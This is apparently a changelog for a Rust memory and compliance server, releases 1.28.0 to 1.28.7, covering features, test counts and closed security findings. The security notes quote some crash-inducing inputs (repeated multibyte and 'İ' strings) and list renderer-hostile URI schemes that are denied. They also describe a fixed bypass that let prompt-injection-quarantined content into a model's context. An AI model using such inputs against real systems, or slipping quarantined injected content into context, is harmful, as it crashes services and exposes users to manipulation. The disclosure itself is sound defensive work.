- **Tests:** server bin 774 passed (+5: boot-manifest pins, mount-evidence audit row, extended CSP table), lib 166, mcp 19, brain 18, bench 8; crates workspace 122; client 204 (+10: kernel conflict/rollback/reversal matrix, checkpoint replay matrix, manifest validation, digest binding); clippy `-D warnings` + fmt clean on all trees; `cargo audit` clean (2 pre-allowed warnings); wasm 5.72 MB within the 5.73 MB budget.
- **Honest ceilings:** the Rust slot system remains a minimal Cordis-shaped reimplementation (conformance spec lands in a later release), not vendored TS; no JS third-party plugin loading in WASM — new UI plugins are compile-time crates until a JS runtime exists; hot-reload swaps registrations, not running fibers (the unmount/remount driver is test-exercised, the runtime swap driver lands with the streaming conversation surface); the boot manifest's runtime fetch-and-refuse driver likewise awaits that surface — today the integrity contract is pinned server-side and in the loader's pure core; `proposal/updated` progress events are produced but expiry does not yet emit a decided event (the TTL path audits, it does not stream).



## [1.28.7] — 2026-08-22

**Gold Calibration** (server `Cargo.toml`/lock 1.28.6 → **1.28.7**; SDK `brain-engine-sdk` 1.28.4 → **1.28.7**, new `gold-sets` crate, `legal-rules-db` 1.27.29 → **1.28.7**; client + plugin unchanged; no schema change). The scorer no longer measures artifacts — it measures agreed truth.

### Release notes

- **Improvements:** Workflow calibration is now closed-loop: the weekly scoreboard read emits a machine-generated calibration REPORT on the audit chain, and a new DPO/admin endpoint (`POST /workflow/calibration/sign`) records the monthly HUMAN-signed calibration — one per calendar month, with the reviewer's scorer-vs-human agreement (κ), the uplift vs our own baseline, and the reviewer id. Every record rides the existing hash-chained workflow audit family.
- **Improvements:** Law versions are now first-class: every jurisdiction in the DSAR/transfer register carries an explicit law-version label (e.g. PH NPC advisory 2024-04, EU GDPR consolidated 2021), owned by one SDK table so the server register and the legal-rule seeds can never drift; intake envelopes can stamp the law version in force at case open.
- **Improvements:** The quality scorer is now pinned against versioned frozen gold packs (a QC-report pack + five continuity case packs) behind an opt-in `gold-sets` feature — including a κ ≥ 0.70 agreement gate on the frozen human verdicts.
- **Planted-chunk process abort closed (critical):** the recall snippet window mixed byte and char offsets — a stored chunk like `"中"×100 + " alpha"` underflowed the window arithmetic and, with `panic = "abort"` in release, killed the whole server on any reader's ordinary query (a persistent crash loop). The window is now computed in one domain (char space), with regression pins for multibyte content and expanding lowercase mappings (`İ`).
- **Breach deadline overflow closed:** an unbounded `discovered_at` on `POST /breach` overflowed the notification-deadline arithmetic and the persisted row re-aborted every read. Timestamps are bounded at the boundary (positive, ≤ 1 day future skew) and deadline math saturates.
- **MCP protocol-version echo hardened:** a hostile `_meta.protocolVersion` was hex-escaped in `error.message` but echoed RAW in `error.data.requested` — same injection carrier. Both are escaped now.
- **CLI hardening:** `brain domains-recompute` no longer panics on an unexpected response shape; `client *` subcommands percent-encode `{name}` path segments; `brain restore` refuses to run while a brain-server listener answers on its port (split-brain guard) unless `--force`.
- **Security fixes:** Pass-3 security-audit closure (14 findings): consensus join-gates require DISTINCT reviewer identities; the decision ledger verifies fail-closed when signatures exist but the signing key is absent, pins its head per append (tip truncation detected), and refuses records with NUL bytes in engine-controlled fields (preimage ambiguity); `/audit/export` tags every row with its owning domain in both JSONL and PDF; the UMP-markdown projection YAML-escapes all frontmatter values and neutralizes the record-separator sequence in bodies (identity forgery across export/import closed); the GitHub App PEM key enforces the repo-wide 0600 secret-mode posture; reject-path oversight evidence carries the review DIGEST of what was seen; oversight rows bind proposal id + domain; renderer-hostile URI schemes (`javascript:`/`data:`/`file:`/…) are denied at evidence-link and ingest boundaries; archived clients can no longer be silently re-registered; RoPA `retention_days` is bounded and RoPA/inventory/export reads are audited; interview persist propagates outbox failures and stamps caller-supplied time; corrupt workflow state is refused rather than treated as a completed run.
### Engineering record

- New `crates/gold-sets` crate (`publish = false`): seven embedded gold cases (`gold/qc_report.json`, five `gold/gdl_cases/*.json`), each freezing `system_version`, `scorer_version`, κ, an ambiguity register, evidence refs, the human verdict, and the run-shaped artifacts; fails closed on corrupt packs or a κ below 7000 ten-thousandths.
- SDK: pure `calibration` module (Cohen's κ in integer ten-thousandths, weekly/monthly cadence gates, `CalibrationRecord` whose detail string rides `AuditKind::Workflow`) re-exported beside `scoreboard`; `policy::LAW_VERSIONS` + `stamp_envelope_for_jurisdiction`; optional `gold-sets` feature that re-runs the oracle pins (`scorer_oracle_fixture`, cause split, no-auto-publish) against gold truth instead of hand fixtures — without the feature the hand fixtures remain the contract (the documented rollback posture).
- Server: `src/workflow/calibration.rs` owns the cadence/baseline stamps in `schema_meta` (`calibration_last_report_at`, `_last_signed_month`, `_baseline_units`, `_last_kappa_units`) plus the audited report/sign writes via the shared workflow audit path; `GET /workflow/scoreboard` gained an additive `calibration_report_emitted` field; the sign endpoint is Admin + DPO-role gated, wire input validated (reviewer 1..=128 chars, κ sentinel −1 or 0..=10000), 409 `already_signed_this_month` when the gate is shut; route registered in the router, guard table, and openapi.
- Tests: server main bin + lib + aux bins **1003 passed** / 0 failed across all targets (`--features bench`; new pins: calibration cadence/audit-chain ×3, law-version consistency ×1, snippet char-space ×1, deadline saturation ×1, decision hardening ×3, labelled PDF ×1, URI deny-list ×1, interview persist ×1, corrupt-state ×1, consensus distinctness ×1, MCP echo ×1 updated); client **186** unchanged; crates workspace **122** (+9 gold-sets, +5 calibration, +2 legal-rules-db, +1 consensus) and **126** with `--features gold-sets` (+4 gold oracle pins); clippy `-D warnings` + fmt clean (server, client, crates default/gold/compliance-pack/connector-github); lipstyk diff-scoped clean; `cargo audit` clean (2 pre-existing allowed warnings).
- Honest ceilings: server-side κ comes from the human reviewer (or the last signed value for machine reports) — the server cannot run labeling rounds itself; uplift is OUR delta vs OUR baseline, never an external comparison; gold packs are frozen data this repo validates, it does not re-run the labeling round; the monthly gate keys on a ~30.44-day month index, not calendar months.

---



## [1.28.6] — 2026-08-22

**Eval & Release** (server + client `Cargo.toml`/locks 1.28.5 / 1.28.4 → **1.28.6**; SDK crates unchanged; no schema change). The close-out of the 1.28.x line: every finding from the 2026-08-22 security audit (MEMORY_STACK_REPORT) is closed, and the frozen eval set reaches its ≥100-query scale floor.

### Release notes

- **Quarantine bypass closed (critical):** `include_flagged` / `include_decayed` on `/recall` and `/search` were caller-controlled — any read-capable principal could pull prompt-injection-quarantined or decayed content straight into context. Both flags are now operator posture: only a loopback or Admin-authorized principal's `true` is honored; everyone else is clamped to `false`.
- **Attacker-reachable panic fixed:** a crafted ingest (`"İ"` × 20 + `"from 2011"`) panicked the temporal-marker extractor via a Unicode-lowercase byte-offset mismatch, turning ingests into 500s. Lowering is now ASCII-only (offset-preserving).
- **Approval digest binding restored on all client surfaces:** offline approvals from Ops, Overview, replay, and auto-replay previously sent `digest: None`, letting a mutated proposal be promoted under a genuine click. The digest now rides the queued action end-to-end.
- **Workflow steering hardened:** steering text is screened against the prompt-injection blocklist before it can reach the engine state machine; an approve-class role gate now applies on top of domain Write authorization; the bounded steering inbox commits drop-oldest + enqueue atomically.
- **Capability tokens get replay defense:** owner-signed UMP capability tokens may carry a `jti`; a process-lifetime replay cache accepts each `(jti)` exactly once (fail-closed on poisoned state).
- **Security fixes:** Workflow run state is no longer the one raw read seam — it goes through the shared sanitize boundary; rate limiting gains a per-principal second dimension in JWT mode; `sub` identifiers in local logs are masked to hash prefixes; duplicate JWT `kid`s refuse key-store load instead of silently collapsing; model artifacts support fail-closed SHA-256 pinning via `BRAIN_MODEL_MANIFEST`; the snapshot path uses the one shared `VACUUM INTO` escaper.
- **Improvements:** DSAR residue sweeps accept `subject_exact: true` for exact matching alongside the erasure-safe substring default.
- **Improvements:** `/ingest/memory` enforces an explicit entry-count cap (`too_many_entries`, 500).
- **Improvements:** Release binaries are minisign-signable (`scripts/release-sign.sh`) and `install-service.sh` verifies signatures whenever the operator configures `BRAIN_RELEASE_PUBKEY`.
### Engineering record

- Frozen eval set expanded 37 → **106 judged queries** over a 25-doc corpus with per-vertical gold sets (migration, legal, troubleshoot); floors hold: r@5 **0.976**, r@10 **0.991**, MRR **0.956**, nDCG@10 **0.962** (edge profile, fresh instance). Dataset SHA-256 recorded in `BENCHMARKS.md`.
- Audit closure: P0-1 (recall review-flag clamp + pure predicate `review_flags_allowed`, loopback/Admin regression pins), P1-1 (ASCII lowering + hostile-input test), P1-2 (`QueuedAction::Approve.digest` field, serde-default legacy decode pin, ops/overview/replay/main forwarding), P1-3 (steering screen/gate/atomic cap + route-authz guard-table entries + openapi paths), P2-1..P2-10 as listed above, P3 (DSAR exact-match option).
- Tests: server main bin **760 passed** / 6 ignored (+5: review-flag clamp, temporal regression, steering hardening, jwks duplicate-kid, model-pin), lib **156**, brain 19, mcp 19, eval 4 (+2 scale/gold-set pins), metrics 8, bench 8; client **186** (+1 digest round-trip); crates workspace green; clippy `-D warnings` + fmt clean everywhere; `cargo audit` clean (2 pre-existing allowed warnings).
- Honest ceilings: opaque-token mode has no principal identity, so the per-principal limiter applies in JWT mode only; legacy capability tokens without `jti` stay expiry-only until re-minted; legacy queued approvals without a stored digest replay digest-less; model pinning activates only when the operator sets `BRAIN_MODEL_MANIFEST`; minisign verification requires the operator's public key; eval numbers are our-baseline deltas on dev hardware, not external parity claims; DNS-rebinding egress validation remains a documented v2.x ceiling.

---



## [1.28.5] — 2026-08-22

**Compliance Pack** (server `Cargo.toml`/lock 1.28.4 → **1.28.5**; client, plugin, and SDK crates unchanged; no schema change to the default build — the new evidence tables are created only under the opt-in `compliance-pack` cargo feature).

### Release notes

- **Improvements:** New opt-in compliance evidence pack (`--features compliance-pack`) for EU AI Act / GDPR audits: every workflow decision now appends a **decision record** (actor, role, policy version, prompt class, tool, model id, outcome) that is SHA-256 hash-chained AND anchored into the existing audit chain — extended, never a separate trust root. When `BRAIN_AUDIT_SIGNING_KEY` (or `_FILE`, 0600-enforced) is configured, each record also carries a detached Ed25519 signature that verifies outside the server.
- **Improvements:** The decision ledger exports as a bundle: `GET /audit/export?since=&format=jsonl|pdf&rpcId=` — JSONL for machines (with an echoed correlation id for reconciliation), a paginated human-readable PDF for the Annex IV technical file.
- **Improvements:** Human reviews leave oversight evidence: every proposal approval or rejection records who decided, on what snapshot hash (the review digest — never raw content), and with what outcome, linked to its own decision record — the Art.12↔14 link regulators ask for. Approval remains DPO/admin-gated; reject stays always-safe and is recorded as an override.
- **Improvements:** Accuracy/validation declarations can be appended to the same ledger via `POST /compliance/evaluation-record` (dataset SHA-256 + methodology summary + system version), and `GET /compliance/inventory` checks which evidence classes exist across the deployment (decision log, oversight, DSAR ledger, incident log, transfers register, RoPA) and flags missing ones.
- **Improvements:** GDPR Art.30 records of processing: a RoPA registry (`GET|POST /ropa`, `POST /ropa/{id}`, Admin + audited) with activity, controller/processor, categories, recipients, lawful basis, retention, security measures, and transfers.
- **Improvements:** `/retention/report` now discloses the evidence-retention floor: decision records are retained 12 months by default (above the 6-month legal minimum) under the feature.
- **Security fixes:** A wide-mode (group/world-readable) `BRAIN_AUDIT_SIGNING_KEY_FILE` is refused fail-closed: decisions continue hash-chained but are recorded unsigned with an error-level warning, never silently trusted.
- **Security fixes:** Release profile now builds with `overflow-checks = true`: arithmetic near the i64 edge (paginated listings, DSAR/purge offsets) aborts fail-stop instead of wrapping silently. Measured on the synthetic 2000-doc bench (single runs, before → after): ingest 826 → 1037 docs/s, p50 11.88 → 11.51 ms — no regression, far inside the ~2 % ceiling that would have triggered a revert.
- **Security fixes:** The compliance evidence modules deny `clippy::unwrap_used` (`clippy.toml` exempts tests), so request-data paths there are structurally panic-free; `unsafe_op_in_unsafe_fn` and `missing_safety_doc` are denied crate-wide (zero current sites — the first future `unsafe fn` inherits block-scoped safety).
- **Bug fixes:** Fixed a boot-blocking router panic introduced in 1.28.4: `/app` was registered twice (the static SPA seat handlers AND a historical `nest_service("/app", ServeDir)`), and axum 0.8 panics at startup on the conflicting internal wildcards — any full server start failed ("Insertion failed due to conflict with previously registered route"). This is what failed the 1.28.4 CI `server-boot`/`recall eval gate` jobs. The duplicate registration is removed (the handler-based seat already implements MIME, traversal prevention, deep-link fallback, 405-on-non-GET); server boot verified end-to-end on a live release binary.
- **Bug fixes:** `bench` no longer fails against servers ≥ 1.27.23: it reads `capacity.rss_mib` from the Read-gated `/health/db` (with the operator token) instead of the shrunken public `/health`, falling back to legacy shapes for older servers. `BENCH_SCALES` env override documented by use in the overflow-checks A/B.
### Engineering record

- M1 (Art.12): `src/audit/decision.rs` — `DecisionRecord` + `DecisionInput`, per-record chain link over all committed fields plus the previous hash (genesis binds to the empty string, so fabricated earlier histories break verification), detached Ed25519 signing via `BRAIN_AUDIT_SIGNING_KEY`/`_FILE` (0600 check; absent key ⇒ NULL signature, disclosed on export). Every record ALSO extends the existing `audit_events` chain (`AuditKind::Decision`). The recorder lives on the host write path (`WorkflowHost::audit`) — engines cannot write their own evidence; pinned by `host_records_decision_evidence_that_verifies_outside`. Export: `GET /audit/export` (Admin) jsonl/pdf, dependency-free PDF writer with escaping + pagination pinned by tests.
- M2 (Art.14): `oversight_evidence` table + `record_oversight` wired into approve (accept) and reject (override) in the review queue, basis = review digest; authority labels ride the linked decision record's role field. Approval role gating unchanged (v1.23 posture); per-role authority documentation lives in the operator's private governance docs.
- M3 (Art.15): evaluation/validation declarations stored as decision-ledger entries (`prompt_class=evaluation`) tied to dataset hash + version; `GET /compliance/inventory` flags missing artefact classes. Adversarial-testing vocabulary and SBOM mapping remain in the private security-baseline docs (not shipped in-tree).
- M4 (Art.13/30): `ropa_registry` table + routes; disclosure notices continue via the existing `/.well-known/ai-notice` surface. Transparency-register wording/placement evidence stays an operator-private artifact.
- M5 (Art.15/17/73): DSAR pipeline (intake → discovery → fulfilment → proof) and the incident ledger were already shipped (v1.20.x DSAR line; breach module); this release wires both into the inventory checker rather than re-implementing them.
- Feature gating: without `--features compliance-pack` the tables are not migrated, the routes do not exist on the wire, no decision records are written, and behaviour is byte-identical to 1.28.4 (default full suite green: 751 bin / 152 lib). With the feature: 754 bin (+3 pins) / 152 lib (+5 decision-module tests).
- Validation: fmt + clippy `-D warnings --all-targets --features bench` clean in BOTH feature configurations; full test suites green with and without the feature; export round-trip (record → read → Ed25519 verify outside the host path) pinned by test; tamper pins cover mutated fields, forged genesis links, and corrupted signatures.
- Post-implementation hardening pass (round-49 audit follow-ups): F-49a — the 1 GiB body-limit dial on `/domains/{name}/import` is documented in-source as a deliberate, Admin-gated, single-route allowance (the default build keeps its 1 MiB layer everywhere else). F-49b — the new evidence modules deny `clippy::unwrap_used` (`clippy.toml` exempts tests), so request-data paths in the compliance surface are structurally panic-free going forward. Wire-boundary caps added: `rpcId` ≤ 128 chars (echoed via serde_json, never hand-escaped), RoPA fields bounded (256/1024/128-char class caps), evaluation declarations ≤ 8 KB, and `dataset_hash` must be exactly 64 hex characters.
- Post-ship verification: release binary booted end-to-end on a scratch DB (health ok) and exercised with the synthetic bench harness; the 1.28.4 CI failures are reproduced-and-fixed (sdk version pin → asserts `CARGO_PKG_VERSION`; boot panic → duplicate route removed).
- Honest ceilings: certificates prove existence/time/signer/immutability — not fairness, lawfulness, or accuracy of the underlying decisions (that needs governance + legal review); an unsigned chain (no signing key configured) verifies structurally only; law evolves — jurisdiction rules stay a curated, human-checked snapshot; PDF output is plain-text Helvetica rendering for readability, not a typeset Annex IV document; oversight "modify" outcome is not yet emitted (approve maps accept, reject maps override).



## [1.28.4] — 2026-08-22

**Unified Control UI** (server `Cargo.toml`/lock 1.28.3 → **1.28.4**; client 1.27.21 → **1.28.4**; no schema change; plugin unchanged).

### Release notes

- **Improvements:** The operator console gains the premium-shell polish: a warm paper/terracotta light theme (AA-audited accent), enhanced cards and buttons with hover lift and pointer-following glow, shimmer skeletons, spring toasts/modals, and pill badges — all progressive-enhancement CSS that collapses instantly under `prefers-reduced-motion` (durations are token-driven, so the override needs no specificity fights).
- **Improvements:** The nav rail is now collapsible (`⌘B`/`Esc`, persisted preference): collapsed to an icon strip on wide screens, sliding over content as a drawer on narrow ones.
- **Improvements:** Approvals come home: the HITL review queue renders as an approval dock on the Overview surface (no separate-page detour). Every approve binds the `content_digest` of what was shown, so a drifted proposal 409s instead of approving stale bytes; decisions stay role-gated in the UI with the server still enforcing, and each row shows its SLA countdown.
- **Improvements:** Deep links boot properly: brain-server now serves the built client bundle under `/app` (SPA fallback for deep links, correct asset types, unknown extensions as octet-stream, non-GET/HEAD refused 405, path traversal refused). An API-only deployment without the bundle degrades to a clean 404.
- **Improvements:** A stable extension substrate ships under the shell: a slot registry (ordered, keyed, fail-closed visibility) that third-party surfaces mount through instead of hardcoding imports; the api-proxy envelope contract (typed errors, two-layer validation — envelope then payload, unknown kinds denied by default); and a conversation-node assembly engine where chat rows are registered node definitions (assistant streaming→settled, tool running→settled, review jobs, deliveries, workflow runs) folded from events with out-of-order convergence and replay dedup.
- **Improvements:** Web bundle budget tightened to 5.5 MiB and enforced in CI (measured release wasm: 5.49 MB).
- **Bug fixes:** Inline SVG icons/rings no longer break line layout: the media preflight keeps SVG inline-block while images/video stay block.
### Engineering record

- **Server**: new `handlers::frontend` — the static SPA seat as a pure `(root, method, path)` responder pinned by 7 tests (deep-link 200 + html type, exact asset types, unknown extension → octet-stream, traversal refused, 405 on non-GET/HEAD, missing dist → 404 never panic). Routes `/app/` + `/app/{*path}` are public by design (static bundle only; data flows through gated API routes; the existing auth middleware already exempts `/app`). `BRAIN_CLIENT_DIST` overrides the location at first use.
- **Client**: `api_proxy.rs` (envelope contract: bounded ids/kinds, per-kind payload schemas, `HostError::{Envelope,Payload,Handler}`, rpcId echo, InProcess carrier; `ApiClient` remains the web fetch carrier — no duplicate transport); `slots.rs` (SlotKind families, declaration-merging registry keyed-replace, fail-closed visibility predicates, revision counter); `ui_renderer.rs` (ordered render sets, keyed chat dispatch with generic-card fallback, dock order composition); `conversation/` (NodeDefinition table-driven match + per-family fold, assembler with pending-update convergence / overlapping-seq dedup / publication gating, unique-kind event registry, five built-in node families); `approvals.rs` (the dock: digest-bound approve, role-gated decide buttons, SLA labels, slot visibility gate before render).
- **Tests**: client 185 passed (was 169; +16 across proxy/slots/renderer/conversation/approvals incl. the six-path matrix: replace, append, prepend-order, pending-convergence, replay-dedup, family isolation). Server main bin 751 passed / 6 ignored (was 750; +7 frontend, −6 net from fixture consolidation). Crates suite unchanged-green (131).
- **Gates**: fmt + clippy `-D warnings --all-targets --features bench` clean on server, client, crates; lipstyk diff watchdog exit 0 (one SLOP finding fixed: `ls | head` parsing replaced with a newest-mtime glob loop in `bundle-budget.sh`; heuristic warns cleared via table-driven matching, tokenized CSS values, and test-shape variation); `cargo audit` clean at the repo's allowed-warning baseline; bundle budget 5,621,519 < 5,734,400 bytes.
- **Honest ceilings**: the conversation engine is wired to its registry but brain's client is request/response today — the live session-event stream lands with the streaming surface (the pure core ships tested so the shape is stable); slot/chat extensibility is compile-time Rust, no JS loader or hot reload; Lighthouse/frame-rate numbers remain operator measurements (pending); dark theme keeps its existing palette (warm terracotta is light-only); pin/custom session groups deferred.



## [1.28.3] — 2026-08-22

**SDK release** (server `Cargo.toml`/lock 1.28.2 → **1.28.3**; `crates/brain-engine-sdk` 1.28.2 → **1.28.3**; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** Workflows gain a real engine seam: a context mounts ONE workflow engine (a second mount replaces the first via config, never parallel providers), metadata is validated as pure data before any script is evaluated, and a started run hands back handles whose result can never throw — failures arrive as an outcome (`completed` / `error` / `cancelled`), never as an exception.
- **Improvements:** Cancel and dispose are bounded by construction: both settle within a grace window (5 s default) with child-run quiescence, even when the underlying script never settles; run concurrency is capped (refused, never queued unbounded).
- **Improvements:** Workflow lifecycle events (`start` / `phase` / `log` / `agent-start` / `agent-end` / `end`) are observe-only data snapshots delivered through the panic-contained event emitter — a throwing subscriber cannot starve later listeners, and the end snapshot omits the result value.
- **Improvements:** Evidence reduction and quality scoring are now first-class services on the engine context, backed by the same deterministic cores as before — no second implementation.
- **Improvements:** The operator scoreboard endpoint (`GET /workflow/scoreboard`, DPO/admin) aggregates first-contact resolution, repeat contact, correctness, override/abstention/guidance rates, handoff completeness and escalation honor over the most recent runs — all rates in exact integer ten-thousandths.
- **Improvements:** A workflow tool for model-facing surfaces: start → await → dispose in a guaranteed-cleanup shape; anything not `completed` surfaces as a tool error.
- **Improvements:** Prompt caching discipline ships in the SDK: cache-stable system-prompt assembly (no timestamps or randomness) and compaction only under pressure that keeps a verbatim tail and appends one summary entry — history is never rewritten.
- **Security fixes:** Scoreboard `audit_ok` is fail-closed per run: a run counts audit-green only when a workflow audit row actually references it — absence of evidence never counts green.
### Engineering record

- **M1 WorkflowEngine seam**: data-validated meta (name ≤128, description ≤1024, ≤32 phases) refused pre-publish; once-future result; cooperative + blocking-bounded cancel; dispose = cancel + bounded settle + child quiescence; observe-only snapshots through contained emit; one-engine ctx slot; tool surface with 30 s await grace and drop-guard dispose.
- **M2 Services + scoreboard**: `ctx.evidence` / `ctx.scoring` re-export the pure reducer/scorer; host owns the wire shape (SDK stays dependency-free); endpoint derivation defaults absent scorer fields honestly and derives `handoff_complete` from run status.
- **M3 Prompt discipline**: deterministic assembly capped at 20 lines + skill listing (oversized prompts refused, not trimmed); compaction plan keeps the last ~20k tokens verbatim and folds only under ≥16k pressure.
- **M4 Bounds & fuzz**: fuzz crate with committed corpus replayed by normal tests (evidence/meta/hostcall/scorer targets), libFuzzer entry points feature-gated; bounds measured once in BENCHMARKS.md (reducer ~3.7 M findings/s, scorer ~2.3 M runs/s, admit ~24 M/s, lifecycle ~4.9 M/s).
- Tests: server bin **744** / 6 ignored (+2 scoreboard pins), lib **147**, brain 18, mcp 19, bench 8, metrics 2, eval 2; SDK **83** (+10 workflow seam, +3 services, +5 prompt); fuzz corpus replay 4; client 158 unchanged; clippy `-D warnings` + fmt clean (server, crates default + harness-kernel); lipstyk clean across the release diff; `cargo audit` clean (2 allowed warnings, unchanged).
- Honest ceilings: script trust equals bash trust — worker threads are a serialization boundary, not a security boundary (out-of-process sandboxing deferred); no JS/TS legacy entrypoints (native descriptor runtime stays the future v1); the tool abort bridge observes only the cooperative cancel flag; scoreboard rates derive from what runs recorded — runs lacking scorer fields score their defaults, which is visible rather than hidden.

---



## [1.28.2] — 2026-08-22

**SDK release** (server `Cargo.toml`/lock 1.28.1 → **1.28.2**; `crates/brain-engine-sdk` 1.28.1 → **1.28.2**; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** Governed-workflow data is now inside the erasure boundary: a DSAR sweep reaches every workflow table in each domain (runs, steps, findings, contradictions, outbox), and the dry-run footprint reports honestly how many workflow rows a live purge would reach.
- **Improvements:** Legal holds now freeze workflow runs exactly as they freeze memory chunks: a held run is deferred — never silently deleted — and listed with its reasons on the DSAR certificate.
- **Improvements:** A capability policy for engine extensions: three trust profiles (Safe/Standard/Permissive) with per-engine overrides, where deny always outranks allow and anything outside the vocabulary is refused.
- **Improvements:** Hostcalls pass through one audited dispatch: payload canonicalization, a capability check that writes its decision to the audit chain either way, and only then the handler — a misconfigured handler fails loudly instead of degrading.
- **Improvements:** Secrets are mediated: engine-facing key material resolves through a broker that refuses group/world-readable key files outright (no silent fallback to another source), and tools can learn only whether a secret is configured — never its value.
- **Security fixes:** Session state reads by extensions return only the sanitized view (PII redact + invisible-strip + markdown-ref strip); there is no method on the seam that can return raw content.
### Engineering record

- **Capability policy (SDK `trust`):** `ExtensionPolicy { mode, max_memory_mb, default_caps, deny_caps, per_engine }` with the Safe/Standard/Permissive profiles (exec/env denied by default in every profile), the documented precedence table (per-engine deny > global deny > per-engine allow > global allow > mode fallback; explicit denies honored even under Permissive), and the closed `HostCallKind`→capability map (`tool`→tools … `log`→log); unknown kinds parse as errors, never defaults.
- **Hostcall dispatch (SDK `hostcall`):** four ordered steps — test interceptor short-circuit, canonicalization (256 KiB body bound, name bounds, control-char refusal), audited capability check (`Decision::{Allowed,Prompt,Denied}`; Prompt requires consent and audits Denied), kind handler last; missing-handler-after-pass is Internal, never a silent denial. Plus `Budget::effective_timeout` (manager ∩ per-op intersection), cooperative `CancellationToken`, RAII `ExtensionRegion` (drop cancels within the 5 s cleanup budget), pure `exec_mediation` destructive-command table, and a `ManagerProbe` Weak-ref cycle-break (upgrade after drop reads None).
- **Session seam:** SDK `SanitizedSession`/`SessionSource`/`SessionSanitizer` — raw state has exactly one consumer, the sanitizer; server implements both once (`RunStateSource` over `workflow_runs` + `ReadViewSanitizer` = `sanitize_read` under a synthetic least-privileged principal, so admin/loopback PII bypass never leaks through an extension read).
- **Server hostcall wiring (`workflow::hostcalls`):** production posture = Standard plus always-mediated `tools`/`log`; handlers are log (structured emit), session (sanitized view via `WorkflowHost::load_state`), `secret_status` (broker resolves host-side, publishes `{configured}` only, name-shape validated), and `mediated_exec` (exec_mediation gate). Per-engine allow cannot reinstate the global exec/env deny.
- **Erasure reach (`workflow::erasure`):** subject sweep deletes matched runs with their dependents (contradictions via finding joins, findings, steps, outbox, run row) in the caller's tx; frozen runs (`knowledge_id = -run_id` active-hold convention — chunk ids are positive, so no collision) are deferred and certificate-listed beside held chunks; dry-run counts `workflow_rows` (matched runs incl. frozen + dependents) into the additive `Footprint` field (openapi updated).
- **Secrets broker (`src/secrets.rs`):** `BRAIN_<NAME>_KEY_FILE` (mode-checked via the existing `check_secret_permissions`) → inline env fallback; a wide-mode FILE refuses fail-closed WITHOUT falling through to any other source.
- Tests: server bin **742** / 6 ignored (+9), lib **147** / 1 ignored, brain 19, mcp 19, bench 8, eval/metrics unchanged; client **158**; SDK **68** (+23 across trust/hostcall/session); crates workspace green. Clippy `-D warnings` clean on server (bench) and crates (default + harness-kernel); fmt clean; `cargo audit`: zero vulnerabilities (2 pre-allowed warnings).
- Honest ceilings: workflow scripts hold bash-equivalent trust — the harness contains buggy scripts (bounded grace + force-terminate), it does not defend against hostile code; sandboxing needs an out-of-process engine (future work). Worker-thread isolation is not a security boundary; real isolation is process/container. The run-hold freeze is read-time enforcement over stored rows using the negative-id convention; a future first-class `run_id` column would supersede it. The secret-status tool reveals configuration presence, not material — but a probing engine can still enumerate names.

---



## [1.28.1] — 2026-08-22

**SDK release** (server `Cargo.toml`/lock 1.28.0 → **1.28.1**; `crates/brain-engine-sdk` 1.28.0 → **1.28.1**; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** The engine SDK gains an opt-in plugin kernel: services mount with declared dependencies (ordering enforced, never assumed), and every registration taken through a reversible effect is undone on unmount — load/unload/reload is safe by construction.
- **Improvements:** Declarative harness manifests: a validated YAML file lists plugins and their dependency order; malformed input fails loudly instead of degrading.
- **Improvements:** A typed agent-harness lifecycle: turn snapshots are defensive copies (mid-turn config changes never touch a running turn), structural operations are phase-gated, and queued session writes flush in deterministic order at save-points and at run finish/abort.
- **Improvements:** Typed hooks with four dispatch modes — broadcast observe, short-circuit policy (first denial wins and stands), ordered mutation, and deterministic fan-out — each with per-listener panic containment and registration provenance.
- **Improvements:** A fail-closed execution environment for tools: no tool touches the filesystem or processes directly; the default seam refuses everything, path escapes are refused before the seam runs, and shell commands are allowlist-gated.
- **Improvements:** Tool registry alignment: what a model sees presented, what can be looked up, and what executes are one set by construction; mid-session tool additions load additively with a full-list fallback counted as a cache miss.
- **Security fixes:** Hostcall capability gate: every dispatch checks a trust posture against an operation class, unknown pairs deny, and both grants and denials emit audit rows on the same chain engines use — a denied hostcall can never bypass the record silently.
### Engineering record

M1 plugin kernel (`sdk::plugin` + `sdk::loader`): `Service` trait with stable `key()` wire names and `inject()` dependency lists enforced at install; `Context` owns services by type plus an effect stack whose entries undo in strict reverse order via `EffectHandle` drop/dispose; `reload` unmounts then remounts the same instance (single-process HMR). Manifest loader validates plugin order + inject ordering and fails loud. M2 agent-harness lifecycle (`sdk::harness`): `Phase::{Idle,Running,Compact}` gates structural ops (`compact`, `set_leaf_id`, tree navigation) while steering/follow-up/config setters stay legal mid-turn; `TurnSnapshot` is an owned clone captured at `start_run`; pending session writes drain FIFO strictly after `message_end` persistence; finish and abort share one settlement path that drains residuals, returns to Idle, runs deferred-idle work in order, and audits `RunStart`/`RunEnd`; non-main lanes get read-only handles whose run ops reject. M3 typed hooks (`sdk::events`): one `Hooks` registry owning registration + provenance sidecar + four modes (`emit`, `waterfall`, `serial`, `parallel`); throwing subscribers are contained per listener (cloned payloads) and never starve later listeners. M4 execution environment (`sdk::env`): tools receive a cloned narrowed `ExecutionEnv`; built-in Read/Write/Edit/Bash factories route everything through the injected seam; registry enforces presentation/lookup/execution alignment plus additive mid-session loading. M5 security carry-over (`sdk::capability`): coarse posture ladder (Safe ⊂ Standard ⊂ Permissive) checked per hostcall class, fail-closed on unknown pairs, decisions audited in the same step; audited mount/unmount helpers put plugin lifecycle rows on the shared chain.

All kernel code is feature-gated (`--features harness-kernel`); without it the SDK compiles exactly as 1.28.0 (zero new dependencies, same public ABI). Tests: brain-engine-sdk 18 → **49** passed with the feature (31 new across kernel, harness, events, env, capability), 18 without; crates workspace suite green. Clippy `-D warnings` + fmt clean.

Honest ceilings: the kernel is a minimal Cordis-shaped reimplementation — full Cordis semantics (cross-process HMR, nested-fiber lifecycles) deferred; remote-session/CBOR transport out of scope; the capability ladder is the invariant skeleton of the full per-engine policy landing next release; waterfall's "monotonic final denial" means first-deny short-circuit (later listeners do not run); serial mutations are single-threaded ordered application, not concurrent.



## [1.28.0] — 2026-08-22

**Server + crates release** (server `Cargo.toml`/lock 1.27.42 → **1.28.0**; new `crates/brain-engine-sdk` at **1.28.0**; no schema change; client + plugin unchanged).

### Release notes

- **Improvements:** New stable engine ABI: the `brain-engine-sdk` crate — pure decision cores, policy vocabulary, and a storage-agnostic write seam (`WorkflowHost`) that third-party engines compile against instead of the server.
- **Improvements:** Storage-portable by construction: every seam signature is value-typed, so a future Postgres (or any transactional) backend can be added behind the same trait without engine code changes.
